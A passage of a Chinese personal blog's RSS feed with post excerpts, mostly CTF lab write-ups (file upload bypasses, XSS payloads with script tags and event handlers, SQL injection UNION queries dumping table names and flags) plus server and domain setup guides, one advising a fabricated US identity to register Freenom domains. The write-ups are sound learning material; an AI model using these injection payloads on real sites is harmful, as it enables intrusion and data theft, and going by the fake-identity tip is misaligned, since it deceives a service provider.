      <description>前言 ​&#x9;继续接着上一次的Upload-labs往下写。这记下第11-15题，目前进度是20题都已经完成正在抽时间写博客，然后16题是我卡的最久的关，不过也学到了感觉很牛的姿势，所以到时候专门开一篇只讲16。&#xA;​&#x9;在线靶机地址：&#xA;linux环境 windows环境 Pass-11 ​&#x9;(这题使用了windows环境)&#xA;​&#x9;源码：&#xA;$is_upload = false; $msg = null; if(isset($_POST[&amp;#39;submit&amp;#39;])){ $ext_arr = array(&amp;#39;jpg&amp;#39;,&amp;#39;png&amp;#39;,&amp;#39;gif&amp;#39;); $file_ext = substr($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;],strrpos($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;],&amp;#34;.&amp;#34;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;]; $img_path = $_GET[&amp;#39;save_path&amp;#39;].&amp;#34;/&amp;#34;.rand(10, 99).date(&amp;#34;YmdHis&amp;#34;).&amp;#34;.&amp;#34;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = &amp;#39;上传出错！&amp;#39;; } } else{ $msg = &amp;#34;只允许上传.jpg|.png|.gif类型文件！&amp;#34;; } } ​&#x9;分析代码发现是一个白名单验证，但是和之前不同点在于路径中使用了$_GET[&#39;save_path&#39;]，本题提示也写道&#xA;本pass上传路径可控！，就是通过这个GET变量控制上传路径。&#xA;​&#x9;这一关的突破方法需要有一些条件：php版本需要低于5.3.29（我使用的是php版本5.3.17的本地靶机），另一个条件是magic_quotes_gpc需要为关闭状态。magic_quotes_gpc的作用官方文档写道：&#xA;Warning 本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。&#xA;​ 为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。 当 magic_quotes 为 on，所有的 &amp;rsquo; (单引号)、&amp;quot; (双引号)、\（反斜杠）和 NUL&amp;rsquo;s 被一个反斜杠自动转义。</description>
    </item>
    <item>
      <title>jsDelivr加速静态博客</title>
      <link>/posts/play_time/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/</link>
      <pubDate>Wed, 11 Nov 2020 21:37:53 +0000</pubDate>
      <guid>/posts/play_time/jsdelivr%E5%8A%A0%E9%80%9F%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/</guid>
      <description>前言 ​&#x9;这几天总感觉博客访问特别慢，最先是找到了CDN加速，但是在国内加速的话域名都是要备案的，又看了看境外加速。&#xA;CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科&#xA;在犹豫要不要买的时候，发现了这个东西：jsdelivr，一个可以加速静态资源的免费CDN，官网上能看的出和WordPress有什么py关系还可以加速github的资源。hexo是静态博客，那么我就把博客要用到的js、css、还有博客用到的一些图片都放github然后引用。开搞&#xA;1. 新建仓库 ​&#x9;名字重了是因为我已经创建好了并且使用了以后才来写的博客。&#xA;2. 克隆Git仓库到本地 ​&#x9;在自己电脑建个文件夹然后打开git输入git clone 你仓库的链接，把刚刚创建的仓库拉倒本地方便上传到仓库。&#xA;廖雪峰老师的git教程我当时看了一遍，觉得非常棒，哈哈哈就是自己太菜了又给忘了，帖出来：Git简介。&#xA;3. 上传需要加速的资源 ​&#x9;把需要上传的资源整理到刚刚拉下来的本地git仓库，上传。&#xA;git status //查看状态&#xD;git add . //添加所有文件到暂存区&#xD;git commit -m &amp;#39;第一次提交&amp;#39; //把文件提交到仓库&#xD;git push //推送至远程仓库 ​&#x9;这里我说一下是怎么加速自己的博客的，因为博客加载的时候需要加载主题的各种js和css文件，然后因为服务器网渣所以加载时间很慢，使用加速的话就会加载的快。&#xA;​&#x9;接下来是要上传哪些文件，我使用的是butterfly这个主题，主题github支持一下作者，直接在主题theme/butterfly文件夹下面找到资源文件夹source发现里面都是一些零碎的文件，但是在发布文件夹public下是一个完整的js和css，所以猜测生成的时候会把零碎的文件进行整合，然后主题配置文件里作者也写的很清楚&#xA;穷人流下了不争气的泪。传！(真加速还得选好服务器)&#xA;​&#x9;这里我的分析是：由于引用的不是本地的资源文件，所以可能会产生自己在本地修改了某项配置，但是网页没有生效，这里就需要时刻记着自己引用的是github上的资源，如果本地配置大改的话，github上的文件也要进行重新上传覆盖。&#xA;​&#x9;做法：配置文件里找到引用的是本地资源的项，然后在生成网站的public文件下找到对应的资源文件。&#xA;我列一下我在配置文件里修改的项：main_css、main、utils、local_search、algolia_js、translate，因为使用的是Valine评论，里面可以设置自定义表情，我也使用这个方法修改了。&#xA;3. 获取地址 ​&#x9;官网首页很清楚的写明了如何获取资源链接&#xA;​&#x9;https://cdn.jsdelivr.net/gh/user/repo@version/file，user就是你的github用户名，repo@version，仓库加上版本号，file就是仓库下的路径。&#xA;​&#x9;这里我没有说版本号是因为网上的教程讲到了仓库需要发布，但是我后面无意间发现不用发布直接reop@分支名，也可以访问到。并且我一开始也发布仓库了，但是后面想要修改已经上传的文件也出了一些问题，索性直接用简单的。&#xA;​&#x9;贴一个我博客首页的壁纸链接：https://cdn.jsdelivr.net/gh/penginman/PicBed@master/top_img/83531406_p0.png&#xA;​&#x9;这个壁纸有12M大小，而且链接也符合上面的格式，可以参考一下。&#xA;4. 引用链接 ​&#x9;配置文件里可以找需要替换的资源，直接贴上链接就可以了，只不过以后别忘了你现在引用的是之前的上传的静态资源，别忘啦！别忘啦！别忘啦！&#xA;​&#x9;我发现github能这样用以后就在上面整了图床，现在博客里的图片都开始在上传，之前用的路过图床，说的全球都有CDN加速，但是还是卡的一。&#xA;​&#x9;还有我整理的Valine评论的自定义表情，大伙可以直接拿去用：图片地址，emojimap。完工</description>
    </item>
    <item>
      <title>Upload-Labs(二)</title>
      <link>/posts/ctf/upload-labs2/</link>
      <pubDate>Mon, 09 Nov 2020 20:12:27 +0000</pubDate>
      <guid>/posts/ctf/upload-labs2/</guid>
      <description>前言 ​&#x9;这次彻底的从头到尾分析了一下源码的执行过程，大致的写一下，以防以后再看的时候不知道题目是什么情况。&#xA;$is_upload = false;&#xD;$msg = null;&#xD;if (isset($_POST[&amp;#39;submit&amp;#39;])) {&#xD;if (file_exists(UPLOAD_PATH)) {&#xD;//这里下面是过滤&#xD;$deny_ext = array(&amp;#34;.php&amp;#34;,&amp;#34;.php5&amp;#34;,&amp;#34;.php4&amp;#34;,&amp;#34;.html&amp;#34;, ......);&#xD;$file_name = trim($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]);&#xD;$file_name = deldot($file_name);//删除文件名末尾的点&#xD;$file_ext = strrchr($file_name, &amp;#39;.&amp;#39;);&#xD;$file_ext = strtolower($file_ext); //转换为小写&#xD;$file_ext = str_ireplace(&amp;#39;::$DATA&amp;#39;, &amp;#39;&amp;#39;, $file_ext);//去除字符串::$DATA&#xD;$file_ext = trim($file_ext); //首尾去空&#xD;//这里下面是移动文件。&#xD;if (!in_array($file_ext, $deny_ext)) {&#xD;$temp_file = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];&#xD;$img_path = UPLOAD_PATH.&amp;#39;/&amp;#39;.$file_name;&#xD;if (move_uploaded_file($temp_file, $img_path)) {&#xD;$is_upload = true;&#xD;} else {&#xD;$msg = &amp;#39;上传出错！&amp;#39;;&#xD;}&#xD;} else {&#xD;$msg = &amp;#39;此文件类型不允许上传！&amp;#39;;&#xD;}&#xD;} else {&#xD;$msg = UPLOAD_PATH .</description>
    </item>
    <item>
      <title>Upload-Labs(一)</title>
      <link>/posts/ctf/upload-labs1/</link>
      <pubDate>Sun, 08 Nov 2020 19:23:16 +0000</pubDate>
      <guid>/posts/ctf/upload-labs1/</guid>
      <description>介绍 大部分的网站和应用系统都有上传功能，而程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全。&#xA;在线靶机地址：&#xA;linux环境 windows环境 Pass-01 ​&#x9;尝试上传php木马，发现提示上传错误&#xA;​&#x9;提示只能上传jpg、png、gif类型的图片。查看源码发现是一个前端的后缀过滤，那么我们尝试绕过前端的JS代码。&#xA;​&#x9;源码：&#xA;function checkFile() { var file = document.getElementsByName(&amp;#39;upload_file&amp;#39;)[0].value; if (file == null || file == &amp;#34;&amp;#34;) { alert(&amp;#34;请选择要上传的文件!&amp;#34;); return false; } //定义允许上传的文件类型 var allow_ext = &amp;#34;.jpg|.png|.gif&amp;#34;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&amp;#34;.&amp;#34;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + &amp;#34;|&amp;#34;) == -1) { var errMsg = &amp;#34;该文件不允许上传，请上传&amp;#34; + allow_ext + &amp;#34;类型的文件,当前文件类型为：&amp;#34; + ext_name; alert(errMsg); return false; } } ​&#x9;把文件后缀名改成jpg格式上传，使用burp suit抓包。把.jpg后缀重新改为.php即可实现绕过前端JS代码。&#xA;​&#x9;然后右键打开图片，代码成功执行。完工</description>
    </item>
    <item>
      <title>Hackgame2020(二)</title>
      <link>/posts/ctf/hackgame20202/</link>
      <pubDate>Thu, 05 Nov 2020 09:29:22 +0000</pubDate>
      <guid>/posts/ctf/hackgame20202/</guid>
      <description>一闪而过的Flag ​&#x9;根据题目信息程序每次运行时隐约可见黑色控制台上有 flag 一闪而过，我想到了应该能看程序的代码啥的找到，但是天下武功，唯快不破，下载 运行 截图一气呵成。&#xA;​&#x9;​&#x9;接下来让我康康哪一位是瞎子，包括答案里也是满满的嘲讽。&#xA;参考答案：flag{Are_you_eyes1ght_g00D?_can_you_dIst1nguish_1iI?}&#xA;从零开始的记账工具人 ​&#x9;npy给了我一张账单，让我计算账单上面的金额，flag就是由金额组成的。本以为是一个简单的Excel的表格函数解决，打开我傻了。&#xA;​&#x9;原来是搞这个大小写金额的转换，没见过Excel有这种操作就去百度，转了一大圈，网上只有数字转大写金额的，没有反过来的。还去了github上找代码，发现运行的结果和自己想要的还是有些出入。卡了有足足半天，之后自己写了一个Java代码跑了一遍，代码如下：&#xA;import java.util.Scanner; public class Main { public static void main(String[] args) { Scanner sn = new Scanner(System.in); String str; int x; int cnt=0; double result=0; while(cnt++!=1000){ str = sn.next(); x = sn.nextInt(); result += tonum(str)*x; } System.out.println(result); } public static double tonum(String s){ int len; double res=0,temp = 1; double result=0; len = s.length(); for(int i=0;i&amp;lt;len;i++){ switch (s.</description>
    </item>
    <item>
      <title>XSS-Lab (一)</title>
      <link>/posts/ctf/xss-lab1/</link>
      <pubDate>Tue, 03 Nov 2020 10:13:39 +0000</pubDate>
      <guid>/posts/ctf/xss-lab1/</guid>
      <description>头 靶机地址：https://buuoj.cn/challenges#XSS-Lab&#xA;level 1 ​&#x9;​&#x9;观察发现欢迎用户test与URL中的name=test字段对应，尝试修改发现可行。直接将name字段改为name=&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;，完工。&#xA;level 2 ​&#x9;在搜索栏中的输入会回显到页面，查看网页源代码，发现值在input的value属性中&#xA;​&#x9;构造闭合&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // ，构造以后的标签会变成.... value=&amp;quot;&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // &amp;quot;&amp;gt;。完工&#xA;level 3 ​&#x9;老样子构造value属性闭合，尝试&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // 构造闭合，查看网页源代码发现语句变成&amp;amp;quot;&amp;amp;gt; &amp;amp;lt;script&amp;amp;gt;alert()&amp;amp;lt;/script&amp;amp;gt; // ，说明把&amp;quot;、&amp;lt;、&amp;gt;、进行了html编码过滤，尝试构造onmouseover事件(鼠标移到事件)，构造语句&#39;onmouseover=&#39;alert()&#39;。完工&#xA;level 4 ​&#x9;构造闭合&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // ，查看源代码发现进行了&amp;gt;、&amp;lt;过滤，尝试构造事件&amp;quot; onmouseover=&#39;alert()&#39;。完工&#xA;​&#x9;说明一下标签的事件有很多类型，可以自己试试别的事件响应。&#xA;level 5 ​&#x9;检查一下都有什么过滤。发现有一下过滤&#xA;script &amp;ndash;&amp;gt; scr_ipt&#xA;onmouseover &amp;ndash;&amp;gt; o_nmouseover&#xA;无法采用事件，那么尝试构造一个标签 &amp;quot;&amp;gt; &amp;lt;a href=&#39;javascript:alert()&#39;&amp;gt;233&amp;lt;/a&amp;gt; //，发现javascript没有过滤，说明判断语句匹配值仅仅为script，点击构造的&amp;lt;a&amp;gt;标签内容。完工&#xA;​</description>
    </item>
    <item>
      <title>Hackgame2020(一)</title>
      <link>/posts/ctf/hackgame20201/</link>
      <pubDate>Sun, 01 Nov 2020 18:33:40 +0000</pubDate>
      <guid>/posts/ctf/hackgame20201/</guid>
      <description>前言 比赛地址：https://hack.lug.ustc.edu.cn/&#xA;web 签到题 ​&#x9;第一题是flag提取器，打开题目以后页面是一个提取器下面一个进度条和一个提取按钮。&#xA;​&#x9;随便拉了拉进度条发现初始是0末尾是1.5，然后中间的数值都是小数&#xA;​&#x9;我猜的题目可能是想让数值为1时能提取到flag。&#xA;​&#x9;F12查看源代码，定位到进度条的标签，查看属性&#xA;​&#x9;确实和猜测一样最大最小值分别是0、1.5，注意到step值为0.00001，就是这个属性让我们拖动进度条时，递增的值是小数，想精准得到1个flag，就把网页上的step值改为1。然后随便拖动一下进度条得到1，点击提取按钮，完工。&#xA;2048 ​&#x9;打开题目是一个2048的小游戏，第一个想法就是玩2048达到一定分数以后会获得flag（可恶这个比赛怎么知道最近我天天在玩2048的）,但是想比赛不可能让选手在线玩游戏吧，尤其对于我这种逃课废物是不可能努力哒！&#xA;F12开始翻网页资源&#xA;​&#x9;还好上次摸鱼课题做了一个网页版的2048，略微能看懂一点点结构，第一个animframe_polyfill应该就是管动画效果的，keynpard...这个肯定是相应按键的，local_storage_manager应该是保存游戏的，game_manager感觉就是管理整个游戏的主要文件。&#xA;​&#x9;打开game_manager粗略的看了下变量，score 分数、over、won、keepPlaying游戏状态，想赢游戏肯定是和score、won有关，直接Ctrl+F搜索整个文档这两个变量出现的位置。&#xA;发现了&#xA;​&#x9;只有这里修改了won的状态，前面还有个16384这个应该就是获得胜利需要得到的分数，这个分数对于我来说还是简简单单（小声bb截图为证），直接让if里面的语句为真就可以获胜，直接修改if(1) self.won = true，保存文件，按一个方向键让语句执行到，完工。&#xA;general 猫咪问题++ ​&#x9;秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解&#xA;​&#x9;题意思很明显的书考验同学的搜题技巧。那就开工。&#xA;第一题 以下编程语言、软件或组织对应标志是哺乳动物的有几个？ Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.&#xA;提示：学术上一般认为龙不属于哺乳动物。&#xA;​&#x9;本人只认识几个，那就一个一个搜呗。我的模式是：百度xxx标志然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度xxx是哺乳动物吗，妥妥的胎儿教学。&#xA;​&#x9;一个比较有印象就是FreeDOS这个标志就离谱，什么玩意&#xA;参考答案 ：12&#xA;第二题 第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？ ​&#x9;卡了我好一会，没听过信鸽传输，贴上最后找到答案的博客，以及一篇信鸽传输的历史发展，长见识了。&#xA;参考答案：256&#xA;第三题 USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？ 提示：活动记录会在哪里？</description>
    </item>
    <item>
      <title>sql-labs(一)</title>
      <link>/posts/ctf/sql-labs1/</link>
      <pubDate>Tue, 22 Sep 2020 10:50:08 +0000</pubDate>
      <guid>/posts/ctf/sql-labs1/</guid>
      <description>前言 在线靶机地址：https://buuoj.cn/challenges#sqli-labs&#xA;less-1 ​&#x9;首先说明sql注入的大致步骤：&#xA;判断注入类型。如整型字符型注入等。 判断列数 判断数据的回显位 构造sql语句 ​&#x9;根据题目提示，说明是一个单引号注入题目，构造一个带单引号的语句?id=1&#39;，发现数据库报错&#xA;​&#x9;通过后面的报错语句1&#39;&#39; LIMIT 0,1的分析，我们的单引号被数据库解析，那么说明我们也可以使用连接查询union插入我们想要查询的语句。&#xA;​&#x9;推出数据库的查询的部分语句可能为where id = &#39;$id&#39;LIMIT 0,1，那么通过构造闭合?id=1&#39; [这里添加语句] --+添加自己想要语句，语句后面的--+作用是将后面的其他语句注释掉。&#xA;​&#x9;首先是判断字段个数：?id=1&#39; order by 1 --+，页面显示正常，直到尝试?id=1&#39; order by 4 --+发现数据库报错&#xA;​&#x9;说明数据库的字段值只有四个。&#xA;​&#x9;接下来测试数据的回显位，构造语句?id=&#39; union select 1,2,3 --+，这里需要注意的有，前面id的查询一定是要不存在的，因为数据库只会回显第一条查询的数据，如果第一条语句查询成功则后面union构造的语句就不会显示；union连接查询语句后面查询的字段数需要和前面的字段数相等，详细用法可以自行查询。&#xA;​&#x9;执行后页面显示。&#xA;​&#x9;说明查询语句的2,3是回显位，之后就可以将查询的语句进行替换。如：&#xA;​&#x9;获取数据库版本，数据库路径，当前用户，当前数据库： ​&#x9;?id=&#39; union select 1,concat_ws(&#39;_&#39;,user(),version(),database()),@@basedir --+&#xA;页面显示&#xA;​&#x9;利用元数据库来爆表、爆数据&#xA;​&#x9;?id=&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+&#xA;​&#x9;之后大家可以自行发挥。&#xA;​&#x9;flag的话我做的题是在ctftraining.flag表中，答案在：?id=&#39; union select 1,flag,3 from ctftraining.</description>
    </item>
    <item>
      <title>Chevereto-搭建一个自己的图床</title>
      <link>/posts/play_time/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/</link>
      <pubDate>Sun, 20 Sep 2020 11:09:02 +0000</pubDate>
      <guid>/posts/play_time/chevereto-%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/</guid>
      <description>博客搭完了，自己选择的这个博客主题又是以图片为主要元素的，当然要考虑图片的使用问题了，原来打算直接放在服务器上，但是后来想了想，以后如果文章越写越多用的图太多服务器的流量也不够用，想到了图床这一托管图片的服务，但是放在别人的上面总怕会受到限制，正好发现了Chevereto这一图床系统，可以自己搭建一个图床服务器，正好自己还有一个阿里云学生云，那就开工。&#xA;Chevereto 说明 Chevereto是一个可以帮助你建立自己的图像分享网站（图床）的应用程序，我们的目标是可以让世界上的任何一个人都可以建立自己的图像共享平台。我们坚定不移的为那些想要可定制的白标图像共享服务的人建立一个真正的替代品。&#xA;Chevereto分为免费版和付费版，区别肯定就是大小什么的，我这个搭在学生云上肯定就不用想我会选择哪个了吧🤣&#xA;环境说明 因为Chevereto所需要的环境为&#xA;Apache/Nginx&#xA;PHP 5.5+&#xA;MySQL 5.0+&#xA;我太懒了不想动所以我选择使用宝塔面板为我们搭建web环境。&#xA;宝塔面板官网：https://www.bt.cn/&#xA;安装完成以后进入管理面板应该会直接提示你安装需要的环境&#xA;我的环境如下图&#xA;总结安装步骤 去github下载Chevereto的压缩包。 在宝塔面板上新建网站目录，创建一个存图片的数据库(自行创建)。 将Chevereto的压缩包上传到网站目录解压。 访问新建的网站就是Chevereto的管理面板，并进行初始配置。 无了。 开始 github下载地址&#xA;创建网站目录和数据库用户&#xA;因为我域名所以域名留空，提示默认使用80端口，访问地址就是服务器ip地址，剩下的自己随机发挥。&#xA;创建完成后需要配置一下网站配置文件才可以访问到配置页面。 在server{...}中添加&#xA;location / { try_files $uri $uri/ /index.php?$query_string; } 配置完成以后应该会自动保存并重启Nginx。&#xA;将在github上下载的Chevereto压缩包上传到刚刚创建的网站目录中（上图是/www/wwwroot）并解压。 之后就可以直接访问服务器ip:80（80端口可以省略），然后一步一步的进行配置。&#xA;可能会出现的错误&#xA;Chevereto can’t create the app/settings.php file. You must manually create this file&#xA;解决方法：这个错误就是没有找到setting.php配置文件，压缩包内似乎没有创建该文件，我们可以自行创建，在Chevereto的网站目录下的/app目录下执行命令创建文件，并修改文件权限&#xA;touch settings.php chmod +x settings.php 我自己还遇到了第二个错误，大概的意思就是访问权限不足blahbalhblahbla，我改了好久都不行。最后直接把整个网站目录的权限给改了访问成功。知道这样做不对，希望大佬能指点。&#xA;访问网站进行网站的初始化配置，大概就是填写数据库名称、数据库账号密码、管理员的账户和密码和一些信息。 完成以后就可以登陆管理员账号进入管理面板，我是首先去设置里找到语言设置把面板改成了中文。&#xA;完工 管理面板还有好多其他功能，我都还没研究过，大伙可以以后可以自己慢慢学习&#xA;然后我的图床地址：http://47.97.231.10/ (已失效) 🈚👇👻来丶se兔</description>
    </item>
    <item>
      <title>Let_s_Encrypt 免费Https证书</title>
      <link>/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/</link>
      <pubDate>Thu, 03 Sep 2020 15:30:37 +0000</pubDate>
      <guid>/posts/play_time/lets-encrypt-%E5%85%8D%E8%B4%B9https%E8%AF%81%E4%B9%A6/</guid>
      <description>参考文章:Let&amp;rsquo;s Encrypt，免费好用的 HTTPS 证书&#xA;先放官网 Let&amp;rsquo;s Encrypt&#xA;Let&amp;rsquo;s Encrypt 是免费、自动化、开放的证书签发服务, 它得到了 Mozilla、Cisco、Akamai、Electronic Frontier Foundation 和 Chrome 等众多公司和机构的支持，发展十分迅猛&#xA;所需环境 一个 HTTP 服务，以 Nginx 为例&#xA;python&#xA;两个目录:&#xA;/site&#x9;网站目录&#xA;/site_site_cert&#x9;保存证书的目录&#xA;证书的颁发有两种方式：&#xA;通过在线生成 通过网址在线生成，需要验证文件&#xA;通过程序生成 通过本地 IIS，生成后会自动绑定本地 IIS 站点上的HTTPS 域名。&#xA;我使用的是第一种方法：在线生成，原理是：先在你的服务器上传一个密钥，然后Let&amp;rsquo;s Encrypt会对网站进行访问，下载密钥进行验证。&#xA;开工 创建账号 首先创建一个目录，我是在根目录下创建文件夹site_cert&#xA;mkdir /site_cert 这个文件夹用来存放各种临时文件和最后的证书文件。进入这个目录，创建一个RSA私钥，用于Let&amp;rsquo;s Encrypt识别你的身份&#xA;openssl genrsa 4096 &amp;gt; account.key 创建CSR文件 在这之前，还需要创建域名私钥（一定不要使用上面的账户私钥）&#xA;openssl genrsa 4096 &amp;gt; domain.key 我参考的文章提到了两种私钥RSA和ECC，我现在也还不懂什么原理，把两种区别放出来吧&#xA;RSA 私钥：兼容性好&#xA;ECC 私钥：部分老旧操作系统、浏览器不支持。优点是证书体积小&#xA;两个用于身份身份验证的私钥文件创建好，就可以生成CSR（Certificate Signing Request，证书签名请求）文件了，申请时可以把域名带 www 和不带 www 的两种情况都加进去，一张证书最多可以包含100个域名。</description>
    </item>
    <item>
      <title>搭窝过程(二)</title>
      <link>/posts/%E6%90%AD%E7%AA%9D%E8%BF%87%E7%A8%8B%E4%BA%8C/</link>
      <pubDate>Wed, 02 Sep 2020 22:05:34 +0000</pubDate>
      <guid>/posts/%E6%90%AD%E7%AA%9D%E8%BF%87%E7%A8%8B%E4%BA%8C/</guid>
      <description>​&#x9;服务器到手了肯定不能闲着，既然有了国外的服务器，第一个想法就是去整一个魔法，我姐也因为网络问题，经常让我帮忙下载国外的资料，这次整一个就能让我姐自己用了。&#xA;​&#x9;还是出于会被Qang的顾虑，自己对于这方面的知识也很少，普通的建设方法据说已经会被主动嗅探等给检测到，于是就花了很久找伪装的方法，结果在github上找到了一个项目，使用的技术大概就是反向代理+Https的协议，这里就不细讲了主要是害怕，可以自己到项目去看看。&#xA;​&#x9;在这里还学会了搞Let&amp;rsquo;s Encrypt的SSL证书，主要是用来保证数据的加密传输，也就是Https协议，后面开一篇申请证书的过程文章，照着参阅的文章也踩了不少坑。</description>
    </item>
    <item>
      <title>Freenom域名注册解析到服务器</title>
      <link>/posts/play_time/freenom%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E8%A7%A3%E6%9E%90%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</link>
      <pubDate>Wed, 02 Sep 2020 12:25:37 +0000</pubDate>
      <guid>/posts/play_time/freenom%E5%9F%9F%E5%90%8D%E6%B3%A8%E5%86%8C%E8%A7%A3%E6%9E%90%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</guid>
      <description>1.官网 Freenom - 人人都熟悉的名字&#xA;官网右上角可以切换中文，简直了。&#xA;然后觉得我讲的有点啰嗦的还可以看油管上的freenom教学视频&#xA;2.搜索想要的域名 ​&#x9;搜索以后会列出来可以选择的域名列表，上面的是免费域名，下面的则是一些付费域名。&#xA;​&#x9;我在这里还遇到了一个坑提前说。freenom提供的有自己的域名解析服务，国内也可以访问的到，我遇到了一个问题有回答说换个DNS解析就行，推荐的是Hurricane Electric Hosted DNS，但这个网站禁止了.tk域名的解析。类似的问题请自行先考虑&#xA;接下来选中域名以后点击Get it now！以后只是添加到购物车，随后点击界面中的Checkout跳转到结算界面，这里只用选择期限即可。&#xA;点击continue按钮会提示注册，这里又有坑。&#xA;由于蝗虫一般涌入试图薅羊毛的中国人让 freenom 极度不爽, freenom 的免费域名注册对中国人并不友好, 极大概率注册会失败. 为了顺利注册免费域名, 请首先用美国 IP 翻着墙, 使用 Google 账号直接登录该站, 不必自主注册账号, 在填写个人资料时, 用 fakenamegenerator.com 胡诌个美国住址, 就可以随意注册免费域名了.&#xA;3.域名解析 ​&#x9;完成以后点击Services&amp;ndash;&amp;gt;My Domains进入域名管理页面。&#xA;点击域名后面的Manage Domain进入域名解析&#xA;​&#x9;Nameservers就是域名解析服务器进入后两个选项，第一个是使用freenom的域名解析服务器，第二个是使用其他域名解析商的服务器。&#xA;之后点击Manage Freenom DNS进行域名解析就可以使用注册的域名访问了，示例：</description>
    </item>
    <item>
      <title>造窝过程(一)</title>
      <link>/posts/%E9%80%A0%E7%AA%9D%E8%BF%87%E7%A8%8B-%E4%B8%80/</link>
      <pubDate>Wed, 02 Sep 2020 11:14:35 +0000</pubDate>
      <guid>/posts/%E9%80%A0%E7%AA%9D%E8%BF%87%E7%A8%8B-%E4%B8%80/</guid>
      <description>备案劝退 很早就有想搭博客的想法了，起初在阿里云上用宝塔面板搭建过一个，觉得IP访问太暴露了就想去备案，结果阿里云的备案过程真的是把我给整吐了，大概流程就是：填网站信息&amp;raquo;&amp;gt;阿里云审核通过&amp;raquo;&amp;gt;工信部审核。看似个简单的过程，我在阿里云审核那就被劝退了，官方小改改先是跟我说填写信息不能有什么什么字眼，很耐心的帮我改了改，然后让我提供钉钉号，说一会会有官方加我好友跟我视频认证，这对于稍微有点自闭的我来说有点难顶，但想都到这步了硬着头皮来吧。等了一个多小时，我看到邮箱里有封邮件说我拒绝视频认证，审核失败，我tm直接当场？？？看了看钉钉申请和审核失败的邮件，之间就相差了2分钟。&#xA;选择服务器 听说了备案的依据是服务器的地理位置，想到去买国外的服务器，在知乎、谷歌上搜了一大堆国外的服务商，大致推荐的都是：vultr、搬瓦工、blablablabal，看到价格和配置都特别心动，但是都是很久之前的信息，现在已经变贵了，最后挑了一个现在最便宜的pacificrack,看评价说便宜的原因就是超售，而且服务商有可能跑路balbabla的，我现在就心想体验一番管他呢，最后买的配置1cpu 1G 20GB 100Mbps一年$12，觉得比阿里云那个学生云香，最重要的是不用备案！！！！&#xA;域名注册 服务器到手以后，又听说什么国外的服务器有可能会被Qang，我也尽量少选国内提供的服务，随后找到了国外免费的域名注册商freenom，注册了域名braindanc.tk，把域名解析到自己的服务器，后面补一篇注册的过程吧。&#xA;到这服务器和域名都搞定了。</description>
    </item>
    <item>
      <title>第一篇文章</title>
      <link>/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</link>
      <pubDate>Wed, 26 Aug 2020 16:40:03 +0000</pubDate>
      <guid>/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</guid>
      <description>第一篇文章的内容&#xA;刚把博客搭成，然后看了看markdown的语法，以后慢慢往上面加吧。</description>
    </item>
  </channel>
</rss>
